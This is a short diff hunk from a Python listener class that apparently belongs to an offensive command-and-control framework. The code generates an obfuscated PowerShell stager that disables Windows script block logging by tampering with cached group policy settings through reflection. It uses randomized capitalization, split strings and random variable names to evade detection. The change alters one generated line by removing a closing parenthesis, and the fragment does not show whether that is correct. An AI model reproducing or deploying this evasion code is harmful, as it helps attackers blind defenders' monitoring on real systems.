@@ -267,7 +267,7 @@ class Listener:
                     stager += "'System.Management.Automation.Utils'"
                     stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                     stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(");If($"+helpers.generate_random_script_var_name("GPF")+"){$"+helpers.generate_random_script_var_name("GPC")+"=$"+helpers.generate_random_script_var_name("GPF")+".GetValue($null);If($"+helpers.generate_random_script_var_name("GPC")+")")
+                    stager += helpers.randomize_capitalization(");If($"+helpers.generate_random_script_var_name("GPF")+"){$"+helpers.generate_random_script_var_name("GPC")+"=$"+helpers.generate_random_script_var_name("GPF")+".GetValue($null);If($"+helpers.generate_random_script_var_name("GPC")+"")
                     stager += "['ScriptB'+'lockLogging']"
                     stager += helpers.randomize_capitalization("){$"+helpers.generate_random_script_var_name("GPC")+"")
                     stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
